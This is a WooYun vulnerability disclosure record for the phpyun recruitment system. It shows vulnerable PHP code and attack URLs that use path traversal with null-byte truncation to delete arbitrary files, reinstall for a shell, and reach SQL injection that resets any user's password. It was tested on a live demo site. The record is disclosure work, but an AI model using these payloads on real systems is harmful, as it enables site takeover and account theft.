{"id": 41555, "wybug_id": "wooyun-2014-088418", "wybug_title": "phpyun (20141230) 任意文件删除致注入可改任意用户密码(4处打包)", "wybug_corp": "php云人才系统", "wybug_author": "′雨。", "wybug_date": "2014-12-30 12:41", "wybug_open_date": "2015-03-30 12:42", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-30：\t细节向公众公开  简要描述： 更新了 来看看。  果然是功能越多 bug越多 bug越多 rank越多。这个不小心测试了下 demo, 把demo的robots.txt 和 图标都删除了。你们自己再加上去下把。phpyun基本都是靠过滤文件。 如果删除过滤文件 肯定是有注入了。而且删除过滤文件不会像删除install的lock一样对网站造成啥损害。 详细说明：  http://www.phpyun.com/bbs/thread-8149-1-1.html    //20141222http://www.phpyun.com/PHP%E4%BA%91%E4%BA%BA%E6%89%8D%E6%8B%9B%E8%81%98%E7%B3%BB%E7%BB%9FV3.2_Beta.rar最新版本的phpyun下载地址在friend/model/index.class.php中\nfunction save_avatar_action()\t{\t\t@header(\"Expires: 0\");\t\t@header(\"Cache-Control: private, post-check=0, pre-check=0, max-age=0\", FALSE);\t\t@header(\"Pragma: no-cache\");\t\t$type = isset($_GET['type'])?trim($_GET['type']):'small';//没限制\t\t$pic_id = trim($_GET['photoId']);\t\t$nameArr=@explode(\".\",$pic_id);\t\t$uptypes=array('jpg','png','jpeg','bmp','gif');\t\tif(count($nameArr)!=2) //这里限制了只能含有一个小数点\t\t{   \t\t\texit();\t\t}\t\tif(!is_numeric($nameArr[0])) //限制文件的名字必须为数字。\t\t{ \t\t\texit();\t\t}\t\tif(!in_array(strtolower($nameArr[1]),$uptypes)) //限制文件类型只能为图片的各种类型\t\t{\t\t\t$d['statusText'] = iconv(\"gbk\",\"utf-8\",'文件类型不符!');\t\t\t$msg = json_encode($d);\t\t\techo $msg;die;\t\t}\t\t$new_avatar_path = 'upload/friend/friend_'.$type.'/'.$pic_id;\t\t$len = file_put_contents(APP_PATH.$new_avatar_path,file_get_contents(\"php://input\"));//这里不能getshell 因为phpyun全局有转义 没办法截断。 所以也只能写图片。\t\t$avtar_img = imagecreatefromjpeg(APP_PATH.$new_avatar_path);\t\timagejpeg($avtar_img,APP_PATH.$new_avatar_path,80);\t\t$d['data']['urls'][0] =\"../\".$new_avatar_path;\t\t$d['status'] = 1;\t\t$d['statusText'] = iconv(\"gbk\",\"utf-8\",'上传成功!');\t\t$row = $this->obj->DB_select_once(\"friend_info\",\"`uid`='\".$this->uid.\"'\");//查询出来自己的资料\t\tif($type==\"small\")\t\t{\t\t\t$this->obj->unlink_pic($row['pic']);\t\t\t$this->obj->update_once(\"friend_info\",array(\"pic\"=>\"../\".$new_avatar_path),array(\"uid\"=>$this->uid));\t\t\t$state_content = \"我刚更换了新头像。<br><img src=\\\"\".$this->config['sy_weburl'].\"/\".$new_avatar_path.\"\\\">\";\t\t\t$this->addstate($state_content);\t\t\t$this->obj->member_log(\"更换了新头像\");\t\t}else{\t   \t\t\t$this->obj->unlink_pic($row['pic_big']);//删除图片\t\t\t$this->obj->update_once(\"friend_info\",array(\"pic_big\"=>\"../\".$new_avatar_path),array(\"uid\"=>$this->uid));//这里把自己的图片入库\t\t}\t\t$msg = json_encode($d);\t\techo $msg;\t}\n因为全局有转义, 所以$new_avatar_path没办法截断$this->obj->update_once(\"friend_info\",array(\"pic_big\"=>\"../\".$new_avatar_path),array(\"uid\"=>$this->uid)) 但是这里有一个入库。入库了 然后再把 $this->obj->unlink_pic($row['pic_big']);//删除图片出库出来的删掉。   所以我们可以再次截断了。 所以这个截断也无视GPC啥的。用phpyun的demo hr135.com测试 首先注册一个会员 然后请求www.hr135.com//friend/index.php?m=index&c=save_avatar&photoId=1.jpg&type=xxx/../../../robots.txt%00\n\n这样先转义入库了。  然后就按照这样再请求一次。www.hr135.com//friend/index.php?m=index&c=save_avatar&photoId=1.jpg&type=xxx/../../../robots.txt%00再请求一次 出库, 然后就又能截断 成功删除了robots.txt测试的时候把demo的robots.txt删掉了 http://www.hr135.com/robots.txt 已经404了。你们自己添加上去一下把。进一步的利用的话 我们可以先删除lock 然后重装进行getshell/friend/index.php?m=index&c=save_avatar&photoId=1.jpg&type=xxx/../../../data/phpyun.lock%00这个需要请求两次。\n\n\n\n成功GETSHELL。____________________________________________________________________第二处在 member/com/model/show.class.php中\nfunction del_action(){\t\tif($_GET['id']){\t\t\t$row=$this->obj->DB_select_once(\"company_show\",\"`id`='\".(int)$_GET['id'].\"' and `uid`='\".$this->uid.\"'\",\"`picurl`\");//出库\t\t\tif(is_array($row))\t\t\t{\t\t\t\t$this->obj->unlink_pic(\".\".$row['picurl']);//这里把出库的删除掉 来看看哪里入库$oid=$this->obj->DB_delete_all(\"company_show\",\"`id`='\".(int)$_GET['id'].\"' and `uid`='\".$this->uid.\"'\");\t\t\t}\t\t\tif($oid)\t\t\t{\t\t\t\t$this->obj->member_log(\"删除企业环境展示\");\t\t\t\t$this->layer_msg('删除成功！',9);\t\t\t}else{\t\t\t\t$this->layer_msg('删除失败！',8);\t\t\t}\t\t}\n\nfunction upshow_action(){       if($_POST['submitbtn']){       \t$time=time();            unset($_POST['submitbtn']);\t        if(!empty($_FILES['uplocadpic']['tmp_name']))\t\t\t{\t\t\t\t\t$upload=$this->upload_pic(\"../upload/show/\",false);\t\t\t\t\t$uplocadpic=$upload->picture($_FILES['uplocadpic']);\t\t\t\t\t$this->picmsg($uplocadpic,$_SERVER['HTTP_REFERER']);\t\t\t\t\t$uplocadpic = str_replace(\"../upload/show\",\"./upload/show\",$uplocadpic);\t            \t$row=$this->obj->DB_select_once(\"company_show\",\"`uid`='\".(int)$_POST['uid'].\"' and `id`='\".intval($_POST['id']).\"'\",\"`picurl`\");\t\t\t\t\tif(is_array($row))\t\t\t\t\t{\t\t\t\t\t\t$this->obj->unlink_pic(\".\".$row['picurl']);\t\t\t\t\t}\t\t\t}else{\t\t\t\t$uplocadpic=$_POST['picurl'];//当没定义_FILES的时候竟然直接接受_POST来的。。 那么直接用户可控了。\t\t\t}\t\t\t$nid=$this->obj->DB_update_all(\"company_show\",\"`picurl`='\".$uplocadpic.\"',`title`='\".$_POST['title'].\"',`sort`='\".$_POST['showsort'].\"',`ctime`='\".$time.\"'\",\"`uid`='\".$this->uid.\"'and `id`='\".$_POST['id'].\"'\");//入库入库\t\t\tif($nid)\n因为这里是update 所以要先入库一个在model/user.php中\nfunction saveshow_action()\t{\t\tif (!empty($_FILES))\t\t{\t\t\t$pic=$name='';\t\t\t$data=array();\t\t\t$tempFile = $_FILES['Filedata'];\t\t\t$upload=$this->upload_pic(\"./upload/show/\");\t\t\t$pic=$upload->picture($tempFile);\t\t\t$name=@explode('.',$_FILES['Filedata']['name']);\t\t\t$picurl=str_replace(\"../upload/show\",\"./upload/show\",$pic); //可以看到这里是不可控的\t\t\t$data['picurl']= $picurl;\t\t\t$data['title']=$this->stringfilter($name[0]);\t\t\t$data['ctime']=time();\t\t\t$data['uid']=(int)$_POST['uid'];\t\t\t$data['eid']=(int)$_GET['eid'];\t\t\t$id=$this->obj->insert_into(\"resume_show\",$data);\t\t\tif($id){ \t\t\t\techo $name[0].\"||\".$picurl.\"||\".$id;die;\t\t\t}else{\t\t\t\techo \"2\";die;\t\t\t}\t\t}\t}}\n\n\n文件名不可控 再回来update里来这里因为unlink_pic 限制了必须为jpg后缀之类的 这里我们截断一下\n\n\n\n成功删除根目录的文件。_____________________________________________________________________第三处  member/user/model/show.class.php  //跟上面一个相同的原理 不过是因为一个是企业会员操作的 一个是个人会员操作的、 这里代码我都不贴了 你们自己查把。第四处member/user/model/resume.class.php\nfunction del_action(){\t\t$del=(int)$_GET['id'];\t\t$show=$this->obj->DB_select_all(\"resume_show\",\"`eid`='\".$del.\"' and `picurl`<>''\",\"`picurl`\");\t\tif(is_array($show))\t\t{\t\t\tforeach($show as $v)\t\t\t{\t\t\t\t@unlink(\".\".$show['picurl']);\t\t\t}\t\t}\n入库也在/member/user/model/show.class.php function upshow_action(){  也是因为用户可控了。___________________________________________________________________________这里来搞一下注入首先我们用上面的方法删除data/db.safety.php 这个参照上面的方法 就不多说了。首先删除data/db.safety.php 后 就不会转义了 那么我们就能引入单引号了。再找一个不会对查询转义的函数就行了。在model/forgetpw.class.php中\nfunction editpw_action()\t{\t\tif($_POST['username'] && $_POST['code'] && $_POST['pass'])\t\t{\t\t\t$password = $_POST['pass'];\t\t\t\t\t    $cert = $this->obj->DB_select_once(\"company_cert\",\"`type`='5' AND `check2`='\".$_POST['username'].\"' AND `check`='\".$_POST['code'].\"' order by id desc\",\"`uid`,`check2`,`ctime`\");//这里直接把$_POST的带入了查询 因为删除了过滤文件 所以不转义 \t\t\t\t\t\tif(!$cert['uid'])\t\t\t{\t\t\t\t$this->obj->ACT_layer_msg('验证码填写错误！',8,$this->url(\"index\",\"forgetpw\",\"1\"));  \t\t\t}elseif((time()-$cert['ctime'])>1200){\t\t\t\t$this->obj->ACT_layer_msg('验证码已失效，请重新获取！',8,$this->url(\"index\",\"forgetpw\",\"1\"));   \t\t\t}\t\t\t\t\t$info = $this->obj->DB_select_once(\"member\",\"`uid`='\".$cert['uid'].\"'\",\"`email`\");\t\t\tif(is_array($info))\t\t\t{\t\t\t\t$info['username'] = $cert['check2'];\t\t\t\tif($this->config[sy_uc_type]==\"uc_center\" && $info['name_repeat']!=\"1\")\t\t\t\t{\t\t\t\t\t$this->obj->uc_open();\t\t\t\t\tuc_user_edit($info[username], \"\", $password, $info['email'],\"0\");\t\t\t\t}else{\t\t\t\t\t$salt = substr(uniqid(rand()), -6);\t\t\t\t\t$pass2 = md5(md5($password).$salt);\t\t\t\t\t$value=\"`password`='$pass2',`salt`='$salt'\";\t\t\t\t\t$this->obj->DB_update_all(\"member\",$value,\"`uid`='\".$cert['uid'].\"'\");\t\t\t\t}\t\t\t\t$this->obj->ACT_layer_msg('密码修改成功！',9,$this->url(\"index\",\"login\",\"1\"));    \t\t\t}else{\n在满足这些条件后 甚至可以改任意用户的密码\n\n   漏洞证明：  \n\n   修复方案：   漏洞的源头还是任意文件删除 怎么能让用户直接控制呢。   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-12-30 13:41 厂商回复： 感谢提供！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-30 13:46 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  666 4处都不给上个首页。    \n     2014-12-30 16:01 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  @′雨。 phpyun快被你刷成小厂商了...    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}